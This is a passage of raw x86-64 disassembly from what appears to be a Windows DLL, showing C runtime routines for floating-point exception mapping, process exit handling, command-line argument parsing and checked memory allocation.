   180004c8b:	49 3b c0             	cmp    %r8,%rax
   180004c8e:	75 f3                	jne    0x180004c83
   180004c90:	33 c0                	xor    %eax,%eax
   180004c92:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004c97:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180004c9c:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180004ca1:	48 83 c4 20          	add    $0x20,%rsp
   180004ca5:	5f                   	pop    %rdi
   180004ca6:	c3                   	ret
   180004ca7:	48 85 c0             	test   %rax,%rax
   180004caa:	74 e4                	je     0x180004c90
   180004cac:	4c 8b 40 08          	mov    0x8(%rax),%r8
   180004cb0:	4d 85 c0             	test   %r8,%r8
   180004cb3:	74 db                	je     0x180004c90
   180004cb5:	49 83 f8 05          	cmp    $0x5,%r8
   180004cb9:	75 0a                	jne    0x180004cc5
   180004cbb:	4c 89 48 08          	mov    %r9,0x8(%rax)
   180004cbf:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   180004cc3:	eb cd                	jmp    0x180004c92
   180004cc5:	49 83 f8 01          	cmp    $0x1,%r8
   180004cc9:	75 05                	jne    0x180004cd0
   180004ccb:	83 c8 ff             	or     $0xffffffff,%eax
   180004cce:	eb c2                	jmp    0x180004c92
   180004cd0:	48 8b 6b 08          	mov    0x8(%rbx),%rbp
   180004cd4:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   180004cd8:	83 78 04 08          	cmpl   $0x8,0x4(%rax)
   180004cdc:	0f 85 b9 00 00 00    	jne    0x180004d9b
   180004ce2:	48 83 c1 30          	add    $0x30,%rcx
   180004ce6:	48 8d 91 90 00 00 00 	lea    0x90(%rcx),%rdx
   180004ced:	eb 08                	jmp    0x180004cf7
   180004cef:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   180004cf3:	48 83 c1 10          	add    $0x10,%rcx
   180004cf7:	48 3b ca             	cmp    %rdx,%rcx
   180004cfa:	75 f3                	jne    0x180004cef
   180004cfc:	81 38 8d 00 00 c0    	cmpl   $0xc000008d,(%rax)
   180004d02:	8b 7b 10             	mov    0x10(%rbx),%edi
   180004d05:	74 7a                	je     0x180004d81
   180004d07:	81 38 8e 00 00 c0    	cmpl   $0xc000008e,(%rax)
   180004d0d:	74 6b                	je     0x180004d7a
   180004d0f:	81 38 8f 00 00 c0    	cmpl   $0xc000008f,(%rax)
   180004d15:	74 5c                	je     0x180004d73
   180004d17:	81 38 90 00 00 c0    	cmpl   $0xc0000090,(%rax)
   180004d1d:	74 4d                	je     0x180004d6c
   180004d1f:	81 38 91 00 00 c0    	cmpl   $0xc0000091,(%rax)
   180004d25:	74 3e                	je     0x180004d65
   180004d27:	81 38 92 00 00 c0    	cmpl   $0xc0000092,(%rax)
   180004d2d:	74 2f                	je     0x180004d5e
   180004d2f:	81 38 93 00 00 c0    	cmpl   $0xc0000093,(%rax)
   180004d35:	74 20                	je     0x180004d57
   180004d37:	81 38 b4 02 00 c0    	cmpl   $0xc00002b4,(%rax)
   180004d3d:	74 11                	je     0x180004d50
   180004d3f:	81 38 b5 02 00 c0    	cmpl   $0xc00002b5,(%rax)
   180004d45:	8b d7                	mov    %edi,%edx
   180004d47:	75 40                	jne    0x180004d89
   180004d49:	ba 8d 00 00 00       	mov    $0x8d,%edx
   180004d4e:	eb 36                	jmp    0x180004d86
   180004d50:	ba 8e 00 00 00       	mov    $0x8e,%edx
   180004d55:	eb 2f                	jmp    0x180004d86
   180004d57:	ba 85 00 00 00       	mov    $0x85,%edx
   180004d5c:	eb 28                	jmp    0x180004d86
   180004d5e:	ba 8a 00 00 00       	mov    $0x8a,%edx
   180004d63:	eb 21                	jmp    0x180004d86
   180004d65:	ba 84 00 00 00       	mov    $0x84,%edx
   180004d6a:	eb 1a                	jmp    0x180004d86
   180004d6c:	ba 81 00 00 00       	mov    $0x81,%edx
   180004d71:	eb 13                	jmp    0x180004d86
   180004d73:	ba 86 00 00 00       	mov    $0x86,%edx
   180004d78:	eb 0c                	jmp    0x180004d86
   180004d7a:	ba 83 00 00 00       	mov    $0x83,%edx
   180004d7f:	eb 05                	jmp    0x180004d86
   180004d81:	ba 82 00 00 00       	mov    $0x82,%edx
   180004d86:	89 53 10             	mov    %edx,0x10(%rbx)
   180004d89:	b9 08 00 00 00       	mov    $0x8,%ecx
   180004d8e:	49 8b c0             	mov    %r8,%rax
   180004d91:	e8 9a 84 00 00       	call   0x18000d230
   180004d96:	89 7b 10             	mov    %edi,0x10(%rbx)
   180004d99:	eb 0f                	jmp    0x180004daa
   180004d9b:	8b 48 04             	mov    0x4(%rax),%ecx
   180004d9e:	4c 89 48 08          	mov    %r9,0x8(%rax)
   180004da2:	49 8b c0             	mov    %r8,%rax
   180004da5:	e8 86 84 00 00       	call   0x18000d230
   180004daa:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
   180004dae:	e9 18 ff ff ff       	jmp    0x180004ccb
   180004db3:	cc                   	int3
   180004db4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004db9:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180004dbe:	57                   	push   %rdi
   180004dbf:	48 83 ec 20          	sub    $0x20,%rsp
   180004dc3:	49 8b d9             	mov    %r9,%rbx
   180004dc6:	49 8b f8             	mov    %r8,%rdi
   180004dc9:	8b 0a                	mov    (%rdx),%ecx
   180004dcb:	e8 48 1b 00 00       	call   0x180006918
   180004dd0:	90                   	nop
   180004dd1:	48 8b cf             	mov    %rdi,%rcx
   180004dd4:	e8 13 00 00 00       	call   0x180004dec
   180004dd9:	90                   	nop
   180004dda:	8b 0b                	mov    (%rbx),%ecx
   180004ddc:	e8 8b 1b 00 00       	call   0x18000696c
   180004de1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004de6:	48 83 c4 20          	add    $0x20,%rsp
   180004dea:	5f                   	pop    %rdi
   180004deb:	c3                   	ret
   180004dec:	40 53                	rex push %rbx
   180004dee:	48 83 ec 30          	sub    $0x30,%rsp
   180004df2:	48 8b d9             	mov    %rcx,%rbx
   180004df5:	80 3d ec 5d 01 00 00 	cmpb   $0x0,0x15dec(%rip)        # 0x18001abe8
   180004dfc:	0f 85 9e 00 00 00    	jne    0x180004ea0
   180004e02:	b8 01 00 00 00       	mov    $0x1,%eax
   180004e07:	87 05 cb 5d 01 00    	xchg   %eax,0x15dcb(%rip)        # 0x18001abd8
   180004e0d:	48 8b 01             	mov    (%rcx),%rax
   180004e10:	8b 08                	mov    (%rax),%ecx
   180004e12:	85 c9                	test   %ecx,%ecx
   180004e14:	75 33                	jne    0x180004e49
   180004e16:	48 8b 05 e3 51 01 00 	mov    0x151e3(%rip),%rax        # 0x18001a000
   180004e1d:	48 8b 15 bc 5d 01 00 	mov    0x15dbc(%rip),%rdx        # 0x18001abe0
   180004e24:	48 3b d0             	cmp    %rax,%rdx
   180004e27:	74 17                	je     0x180004e40
   180004e29:	8b c8                	mov    %eax,%ecx
   180004e2b:	83 e1 3f             	and    $0x3f,%ecx
   180004e2e:	48 33 c2             	xor    %rdx,%rax
   180004e31:	48 d3 c8             	ror    %cl,%rax
   180004e34:	45 33 c0             	xor    %r8d,%r8d
   180004e37:	33 d2                	xor    %edx,%edx
   180004e39:	33 c9                	xor    %ecx,%ecx
   180004e3b:	e8 f0 83 00 00       	call   0x18000d230
   180004e40:	48 8d 0d d1 5e 01 00 	lea    0x15ed1(%rip),%rcx        # 0x18001ad18
   180004e47:	eb 0c                	jmp    0x180004e55
   180004e49:	83 f9 01             	cmp    $0x1,%ecx
   180004e4c:	75 0d                	jne    0x180004e5b
   180004e4e:	48 8d 0d db 5e 01 00 	lea    0x15edb(%rip),%rcx        # 0x18001ad30
   180004e55:	e8 3a 09 00 00       	call   0x180005794
   180004e5a:	90                   	nop
   180004e5b:	48 8b 03             	mov    (%rbx),%rax
   180004e5e:	83 38 00             	cmpl   $0x0,(%rax)
   180004e61:	75 13                	jne    0x180004e76
   180004e63:	48 8d 15 6e a4 00 00 	lea    0xa46e(%rip),%rdx        # 0x18000f2d8
   180004e6a:	48 8d 0d 47 a4 00 00 	lea    0xa447(%rip),%rcx        # 0x18000f2b8
   180004e71:	e8 4a fd ff ff       	call   0x180004bc0
   180004e76:	48 8d 15 6b a4 00 00 	lea    0xa46b(%rip),%rdx        # 0x18000f2e8
   180004e7d:	48 8d 0d 5c a4 00 00 	lea    0xa45c(%rip),%rcx        # 0x18000f2e0
   180004e84:	e8 37 fd ff ff       	call   0x180004bc0
   180004e89:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180004e8d:	83 38 00             	cmpl   $0x0,(%rax)
   180004e90:	75 0e                	jne    0x180004ea0
   180004e92:	c6 05 4f 5d 01 00 01 	movb   $0x1,0x15d4f(%rip)        # 0x18001abe8
   180004e99:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180004e9d:	c6 00 01             	movb   $0x1,(%rax)
   180004ea0:	48 83 c4 30          	add    $0x30,%rsp
   180004ea4:	5b                   	pop    %rbx
   180004ea5:	c3                   	ret
   180004ea6:	e8 05 0b 00 00       	call   0x1800059b0
   180004eab:	90                   	nop
   180004eac:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   180004eb1:	89 54 24 10          	mov    %edx,0x10(%rsp)
   180004eb5:	55                   	push   %rbp
   180004eb6:	48 8b ec             	mov    %rsp,%rbp
   180004eb9:	48 83 ec 50          	sub    $0x50,%rsp
   180004ebd:	48 c7 45 e0 fe ff ff 	movq   $0xfffffffffffffffe,-0x20(%rbp)
   180004ec4:	ff 
   180004ec5:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   180004eca:	8b d9                	mov    %ecx,%ebx
   180004ecc:	45 85 c0             	test   %r8d,%r8d
   180004ecf:	75 4a                	jne    0x180004f1b
   180004ed1:	33 c9                	xor    %ecx,%ecx
   180004ed3:	ff 15 7f a1 00 00    	call   *0xa17f(%rip)        # 0x18000f058
   180004ed9:	48 85 c0             	test   %rax,%rax
   180004edc:	74 3d                	je     0x180004f1b
   180004ede:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   180004ee3:	66 39 08             	cmp    %cx,(%rax)
   180004ee6:	75 33                	jne    0x180004f1b
   180004ee8:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   180004eec:	48 03 c8             	add    %rax,%rcx
   180004eef:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   180004ef5:	75 24                	jne    0x180004f1b
   180004ef7:	b8 0b 02 00 00       	mov    $0x20b,%eax
   180004efc:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   180004f00:	75 19                	jne    0x180004f1b
   180004f02:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   180004f09:	76 10                	jbe    0x180004f1b
   180004f0b:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   180004f12:	74 07                	je     0x180004f1b
   180004f14:	8b cb                	mov    %ebx,%ecx
   180004f16:	e8 a5 00 00 00       	call   0x180004fc0
   180004f1b:	c6 45 28 00          	movb   $0x0,0x28(%rbp)
   180004f1f:	48 8d 45 18          	lea    0x18(%rbp),%rax
   180004f23:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   180004f27:	48 8d 45 20          	lea    0x20(%rbp),%rax
   180004f2b:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   180004f2f:	48 8d 45 28          	lea    0x28(%rbp),%rax
   180004f33:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   180004f37:	b8 02 00 00 00       	mov    $0x2,%eax
   180004f3c:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   180004f3f:	89 45 d8             	mov    %eax,-0x28(%rbp)
   180004f42:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   180004f46:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   180004f4a:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   180004f4e:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   180004f52:	e8 5d fe ff ff       	call   0x180004db4
   180004f57:	90                   	nop
   180004f58:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   180004f5c:	75 1e                	jne    0x180004f7c
   180004f5e:	e8 59 1a 00 00       	call   0x1800069bc
   180004f63:	83 f8 01             	cmp    $0x1,%eax
   180004f66:	75 04                	jne    0x180004f6c
   180004f68:	32 d2                	xor    %dl,%dl
   180004f6a:	eb 0a                	jmp    0x180004f76
   180004f6c:	e8 17 1a 00 00       	call   0x180006988
   180004f71:	84 c0                	test   %al,%al
   180004f73:	0f 94 c2             	sete   %dl
   180004f76:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   180004f7a:	74 0b                	je     0x180004f87
   180004f7c:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   180004f81:	48 83 c4 50          	add    $0x50,%rsp
   180004f85:	5d                   	pop    %rbp
   180004f86:	c3                   	ret
   180004f87:	8b cb                	mov    %ebx,%ecx
   180004f89:	e8 02 00 00 00       	call   0x180004f90
   180004f8e:	cc                   	int3
   180004f8f:	cc                   	int3
   180004f90:	40 53                	rex push %rbx
   180004f92:	48 83 ec 20          	sub    $0x20,%rsp
   180004f96:	8b d9                	mov    %ecx,%ebx
   180004f98:	84 d2                	test   %dl,%dl
   180004f9a:	74 11                	je     0x180004fad
   180004f9c:	ff 15 3e a1 00 00    	call   *0xa13e(%rip)        # 0x18000f0e0
   180004fa2:	48 8b c8             	mov    %rax,%rcx
   180004fa5:	8b d3                	mov    %ebx,%edx
   180004fa7:	ff 15 43 a1 00 00    	call   *0xa143(%rip)        # 0x18000f0f0
   180004fad:	8b cb                	mov    %ebx,%ecx
   180004faf:	e8 0c 00 00 00       	call   0x180004fc0
   180004fb4:	8b cb                	mov    %ebx,%ecx
   180004fb6:	ff 15 2c a1 00 00    	call   *0xa12c(%rip)        # 0x18000f0e8
   180004fbc:	cc                   	int3
   180004fbd:	cc                   	int3
   180004fbe:	cc                   	int3
   180004fbf:	cc                   	int3
   180004fc0:	40 53                	rex push %rbx
   180004fc2:	48 83 ec 30          	sub    $0x30,%rsp
   180004fc6:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   180004fcd:	ff ff 
   180004fcf:	8b d9                	mov    %ecx,%ebx
   180004fd1:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   180004fd7:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   180004fdc:	48 8d 15 55 b3 00 00 	lea    0xb355(%rip),%rdx        # 0x180010338
   180004fe3:	33 c9                	xor    %ecx,%ecx
   180004fe5:	ff 15 15 a1 00 00    	call   *0xa115(%rip)        # 0x18000f100
   180004feb:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   180004ff0:	85 c0                	test   %eax,%eax
   180004ff2:	74 1e                	je     0x180005012
   180004ff4:	48 8d 15 55 b3 00 00 	lea    0xb355(%rip),%rdx        # 0x180010350
   180004ffb:	ff 15 07 a1 00 00    	call   *0xa107(%rip)        # 0x18000f108
   180005001:	48 85 c0             	test   %rax,%rax
   180005004:	74 07                	je     0x18000500d
   180005006:	8b cb                	mov    %ebx,%ecx
   180005008:	e8 23 82 00 00       	call   0x18000d230
   18000500d:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   180005012:	48 85 c9             	test   %rcx,%rcx
   180005015:	74 07                	je     0x18000501e
   180005017:	ff 15 db a0 00 00    	call   *0xa0db(%rip)        # 0x18000f0f8
   18000501d:	90                   	nop
   18000501e:	48 83 c4 30          	add    $0x30,%rsp
   180005022:	5b                   	pop    %rbx
   180005023:	c3                   	ret
   180005024:	48 89 0d b5 5b 01 00 	mov    %rcx,0x15bb5(%rip)        # 0x18001abe0
   18000502b:	c3                   	ret
   18000502c:	33 d2                	xor    %edx,%edx
   18000502e:	33 c9                	xor    %ecx,%ecx
   180005030:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   180005034:	e9 73 fe ff ff       	jmp    0x180004eac
   180005039:	cc                   	int3
   18000503a:	cc                   	int3
   18000503b:	cc                   	int3
   18000503c:	45 33 c0             	xor    %r8d,%r8d
   18000503f:	41 8d 50 02          	lea    0x2(%r8),%edx
   180005043:	e9 64 fe ff ff       	jmp    0x180004eac
   180005048:	8b 05 8a 5b 01 00    	mov    0x15b8a(%rip),%eax        # 0x18001abd8
   18000504e:	90                   	nop
   18000504f:	c3                   	ret
   180005050:	48 8b c4             	mov    %rsp,%rax
   180005053:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180005057:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000505b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000505f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180005063:	41 54                	push   %r12
   180005065:	41 56                	push   %r14
   180005067:	41 57                	push   %r15
   180005069:	48 83 ec 20          	sub    $0x20,%rsp
   18000506d:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   180005072:	4d 8b e1             	mov    %r9,%r12
   180005075:	49 8b d8             	mov    %r8,%rbx
   180005078:	4c 8b f2             	mov    %rdx,%r14
   18000507b:	48 8b f9             	mov    %rcx,%rdi
   18000507e:	49 83 27 00          	andq   $0x0,(%r15)
   180005082:	49 c7 01 01 00 00 00 	movq   $0x1,(%r9)
   180005089:	48 85 d2             	test   %rdx,%rdx
   18000508c:	74 07                	je     0x180005095
   18000508e:	48 89 1a             	mov    %rbx,(%rdx)
   180005091:	49 83 c6 08          	add    $0x8,%r14
   180005095:	40 32 ed             	xor    %bpl,%bpl
   180005098:	80 3f 22             	cmpb   $0x22,(%rdi)
   18000509b:	75 0f                	jne    0x1800050ac
   18000509d:	40 84 ed             	test   %bpl,%bpl
   1800050a0:	40 b6 22             	mov    $0x22,%sil
   1800050a3:	40 0f 94 c5          	sete   %bpl
   1800050a7:	48 ff c7             	inc    %rdi
   1800050aa:	eb 37                	jmp    0x1800050e3
   1800050ac:	49 ff 07             	incq   (%r15)
   1800050af:	48 85 db             	test   %rbx,%rbx
   1800050b2:	74 07                	je     0x1800050bb
   1800050b4:	8a 07                	mov    (%rdi),%al
   1800050b6:	88 03                	mov    %al,(%rbx)
   1800050b8:	48 ff c3             	inc    %rbx
   1800050bb:	0f be 37             	movsbl (%rdi),%esi
   1800050be:	48 ff c7             	inc    %rdi
   1800050c1:	8b ce                	mov    %esi,%ecx
   1800050c3:	e8 88 32 00 00       	call   0x180008350
   1800050c8:	85 c0                	test   %eax,%eax
   1800050ca:	74 12                	je     0x1800050de
   1800050cc:	49 ff 07             	incq   (%r15)
   1800050cf:	48 85 db             	test   %rbx,%rbx
   1800050d2:	74 07                	je     0x1800050db
   1800050d4:	8a 07                	mov    (%rdi),%al
   1800050d6:	88 03                	mov    %al,(%rbx)
   1800050d8:	48 ff c3             	inc    %rbx
   1800050db:	48 ff c7             	inc    %rdi
   1800050de:	40 84 f6             	test   %sil,%sil
   1800050e1:	74 1c                	je     0x1800050ff
   1800050e3:	40 84 ed             	test   %bpl,%bpl
   1800050e6:	75 b0                	jne    0x180005098
   1800050e8:	40 80 fe 20          	cmp    $0x20,%sil
   1800050ec:	74 06                	je     0x1800050f4
   1800050ee:	40 80 fe 09          	cmp    $0x9,%sil
   1800050f2:	75 a4                	jne    0x180005098
   1800050f4:	48 85 db             	test   %rbx,%rbx
   1800050f7:	74 09                	je     0x180005102
   1800050f9:	c6 43 ff 00          	movb   $0x0,-0x1(%rbx)
   1800050fd:	eb 03                	jmp    0x180005102
   1800050ff:	48 ff cf             	dec    %rdi
   180005102:	40 32 f6             	xor    %sil,%sil
   180005105:	8a 07                	mov    (%rdi),%al
   180005107:	84 c0                	test   %al,%al
   180005109:	0f 84 d2 00 00 00    	je     0x1800051e1
   18000510f:	3c 20                	cmp    $0x20,%al
   180005111:	74 04                	je     0x180005117
   180005113:	3c 09                	cmp    $0x9,%al
   180005115:	75 07                	jne    0x18000511e
   180005117:	48 ff c7             	inc    %rdi
   18000511a:	8a 07                	mov    (%rdi),%al
   18000511c:	eb f1                	jmp    0x18000510f
   18000511e:	84 c0                	test   %al,%al
   180005120:	0f 84 bb 00 00 00    	je     0x1800051e1
   180005126:	4d 85 f6             	test   %r14,%r14
   180005129:	74 07                	je     0x180005132
   18000512b:	49 89 1e             	mov    %rbx,(%r14)
   18000512e:	49 83 c6 08          	add    $0x8,%r14
   180005132:	49 ff 04 24          	incq   (%r12)
   180005136:	ba 01 00 00 00       	mov    $0x1,%edx
   18000513b:	33 c0                	xor    %eax,%eax
   18000513d:	eb 05                	jmp    0x180005144
   18000513f:	48 ff c7             	inc    %rdi
   180005142:	ff c0                	inc    %eax
   180005144:	8a 0f                	mov    (%rdi),%cl
   180005146:	80 f9 5c             	cmp    $0x5c,%cl
   180005149:	74 f4                	je     0x18000513f
   18000514b:	80 f9 22             	cmp    $0x22,%cl
   18000514e:	75 30                	jne    0x180005180
   180005150:	84 c2                	test   %al,%dl
   180005152:	75 18                	jne    0x18000516c
   180005154:	40 84 f6             	test   %sil,%sil
   180005157:	74 0a                	je     0x180005163
   180005159:	38 4f 01             	cmp    %cl,0x1(%rdi)
   18000515c:	75 05                	jne    0x180005163
   18000515e:	48 ff c7             	inc    %rdi
   180005161:	eb 09                	jmp    0x18000516c
   180005163:	33 d2                	xor    %edx,%edx
   180005165:	40 84 f6             	test   %sil,%sil
   180005168:	40 0f 94 c6          	sete   %sil
   18000516c:	d1 e8                	shr    $1,%eax
   18000516e:	eb 10                	jmp    0x180005180
   180005170:	ff c8                	dec    %eax
   180005172:	48 85 db             	test   %rbx,%rbx
   180005175:	74 06                	je     0x18000517d
   180005177:	c6 03 5c             	movb   $0x5c,(%rbx)
   18000517a:	48 ff c3             	inc    %rbx
   18000517d:	49 ff 07             	incq   (%r15)
   180005180:	85 c0                	test   %eax,%eax
   180005182:	75 ec                	jne    0x180005170
   180005184:	8a 07                	mov    (%rdi),%al
   180005186:	84 c0                	test   %al,%al
   180005188:	74 44                	je     0x1800051ce
   18000518a:	40 84 f6             	test   %sil,%sil
   18000518d:	75 08                	jne    0x180005197
   18000518f:	3c 20                	cmp    $0x20,%al
   180005191:	74 3b                	je     0x1800051ce
   180005193:	3c 09                	cmp    $0x9,%al
   180005195:	74 37                	je     0x1800051ce
   180005197:	85 d2                	test   %edx,%edx
   180005199:	74 2b                	je     0x1800051c6
   18000519b:	48 85 db             	test   %rbx,%rbx
   18000519e:	74 05                	je     0x1800051a5
   1800051a0:	88 03                	mov    %al,(%rbx)
   1800051a2:	48 ff c3             	inc    %rbx
   1800051a5:	0f be 0f             	movsbl (%rdi),%ecx
   1800051a8:	e8 a3 31 00 00       	call   0x180008350
   1800051ad:	85 c0                	test   %eax,%eax
   1800051af:	74 12                	je     0x1800051c3
   1800051b1:	49 ff 07             	incq   (%r15)
   1800051b4:	48 ff c7             	inc    %rdi
   1800051b7:	48 85 db             	test   %rbx,%rbx
   1800051ba:	74 07                	je     0x1800051c3
   1800051bc:	8a 07                	mov    (%rdi),%al
   1800051be:	88 03                	mov    %al,(%rbx)
   1800051c0:	48 ff c3             	inc    %rbx
   1800051c3:	49 ff 07             	incq   (%r15)
   1800051c6:	48 ff c7             	inc    %rdi
   1800051c9:	e9 68 ff ff ff       	jmp    0x180005136
   1800051ce:	48 85 db             	test   %rbx,%rbx
   1800051d1:	74 06                	je     0x1800051d9
   1800051d3:	c6 03 00             	movb   $0x0,(%rbx)
   1800051d6:	48 ff c3             	inc    %rbx
   1800051d9:	49 ff 07             	incq   (%r15)
   1800051dc:	e9 24 ff ff ff       	jmp    0x180005105
   1800051e1:	4d 85 f6             	test   %r14,%r14
   1800051e4:	74 04                	je     0x1800051ea
   1800051e6:	49 83 26 00          	andq   $0x0,(%r14)
   1800051ea:	49 ff 04 24          	incq   (%r12)
   1800051ee:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800051f3:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1800051f8:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1800051fd:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   180005202:	48 83 c4 20          	add    $0x20,%rsp
   180005206:	41 5f                	pop    %r15
   180005208:	41 5e                	pop    %r14
   18000520a:	41 5c                	pop    %r12
   18000520c:	c3                   	ret
   18000520d:	cc                   	int3
   18000520e:	cc                   	int3
   18000520f:	cc                   	int3
   180005210:	40 53                	rex push %rbx
   180005212:	48 83 ec 20          	sub    $0x20,%rsp
   180005216:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   18000521d:	ff ff 1f 
   180005220:	4c 8b ca             	mov    %rdx,%r9
   180005223:	48 3b c8             	cmp    %rax,%rcx
   180005226:	73 3d                	jae    0x180005265
   180005228:	33 d2                	xor    %edx,%edx
   18000522a:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000522e:	49 f7 f0             	div    %r8
   180005231:	4c 3b c8             	cmp    %rax,%r9
   180005234:	73 2f                	jae    0x180005265
   180005236:	48 c1 e1 03          	shl    $0x3,%rcx
   18000523a:	4d 0f af c8          	imul   %r8,%r9
   18000523e:	48 8b c1             	mov    %rcx,%rax
   180005241:	48 f7 d0             	not    %rax
   180005244:	49 3b c1             	cmp    %r9,%rax
   180005247:	76 1c                	jbe    0x180005265
   180005249:	49 03 c9             	add    %r9,%rcx
   18000524c:	ba 01 00 00 00       	mov    $0x1,%edx
   180005251:	e8 9a 17 00 00       	call   0x1800069f0
   180005256:	33 c9                	xor    %ecx,%ecx
   180005258:	48 8b d8             	mov    %rax,%rbx
   18000525b:	e8 10 18 00 00       	call   0x180006a70
   180005260:	48 8b c3             	mov    %rbx,%rax
   180005263:	eb 02                	jmp    0x180005267
   180005265:	33 c0                	xor    %eax,%eax
   180005267:	48 83 c4 20          	add    $0x20,%rsp
   18000526b:	5b                   	pop    %rbx
   18000526c:	c3                   	ret
   18000526d:	cc                   	int3
   18000526e:	cc                   	int3
   18000526f:	cc                   	int3
   180005270:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005275:	55                   	push   %rbp
   180005276:	56                   	push   %rsi
   180005277:	57                   	push   %rdi
   180005278:	41 56                	push   %r14
   18000527a:	41 57                	push   %r15
   18000527c:	48 8b ec             	mov    %rsp,%rbp
   18000527f:	48 83 ec 30          	sub    $0x30,%rsp
   180005283:	33 ff                	xor    %edi,%edi
   180005285:	44 8b f1             	mov    %ecx,%r14d
   180005288:	85 c9                	test   %ecx,%ecx
   18000528a:	0f 84 4a 01 00 00    	je     0x1800053da
   180005290:	8d 41 ff             	lea    -0x1(%rcx),%eax
   180005293:	83 f8 01             	cmp    $0x1,%eax
   180005296:	76 16                	jbe    0x1800052ae
   180005298:	e8 57 0e 00 00       	call   0x1800060f4
   18000529d:	bf 16 00 00 00       	mov    $0x16,%edi
   1800052a2:	89 38                	mov    %edi,(%rax)
   1800052a4:	e8 a3 0c 00 00       	call   0x180005f4c
   1800052a9:	e9 2c 01 00 00       	jmp    0x1800053da
   1800052ae:	e8 e5 2c 00 00       	call   0x180007f98
   1800052b3:	48 8d 1d 36 59 01 00 	lea    0x15936(%rip),%rbx        # 0x18001abf0
   1800052ba:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1800052c0:	48 8b d3             	mov    %rbx,%rdx
   1800052c3:	33 c9                	xor    %ecx,%ecx
   1800052c5:	e8 a2 23 00 00       	call   0x18000766c
   1800052ca:	48 8b 35 2f 5d 01 00 	mov    0x15d2f(%rip),%rsi        # 0x18001b000
   1800052d1:	48 89 1d 08 5d 01 00 	mov    %rbx,0x15d08(%rip)        # 0x18001afe0
   1800052d8:	48 85 f6             	test   %rsi,%rsi
   1800052db:	74 05                	je     0x1800052e2
   1800052dd:	40 38 3e             	cmp    %dil,(%rsi)
   1800052e0:	75 03                	jne    0x1800052e5
   1800052e2:	48 8b f3             	mov    %rbx,%rsi
   1800052e5:	48 8d 45 48          	lea    0x48(%rbp),%rax
   1800052e9:	48 89 7d 40          	mov    %rdi,0x40(%rbp)
   1800052ed:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   1800052f1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800052f6:	45 33 c0             	xor    %r8d,%r8d
   1800052f9:	48 89 7d 48          	mov    %rdi,0x48(%rbp)
   1800052fd:	33 d2                	xor    %edx,%edx
   1800052ff:	48 8b ce             	mov    %rsi,%rcx
   180005302:	e8 49 fd ff ff       	call   0x180005050
   180005307:	4c 8b 7d 40          	mov    0x40(%rbp),%r15
   18000530b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180005311:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   180005315:	49 8b cf             	mov    %r15,%rcx
   180005318:	e8 f3 fe ff ff       	call   0x180005210
   18000531d:	48 8b d8             	mov    %rax,%rbx
   180005320:	48 85 c0             	test   %rax,%rax
   180005323:	75 11                	jne    0x180005336
   180005325:	e8 ca 0d 00 00       	call   0x1800060f4
   18000532a:	8d 7b 0c             	lea    0xc(%rbx),%edi
   18000532d:	89 38                	mov    %edi,(%rax)
   18000532f:	33 c9                	xor    %ecx,%ecx
   180005331:	e9 9f 00 00 00       	jmp    0x1800053d5
   180005336:	4e 8d 04 f8          	lea    (%rax,%r15,8),%r8
   18000533a:	48 8b d3             	mov    %rbx,%rdx
   18000533d:	48 8d 45 48          	lea    0x48(%rbp),%rax
   180005341:	48 8b ce             	mov    %rsi,%rcx
   180005344:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   180005348:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000534d:	e8 fe fc ff ff       	call   0x180005050
   180005352:	41 83 fe 01          	cmp    $0x1,%r14d
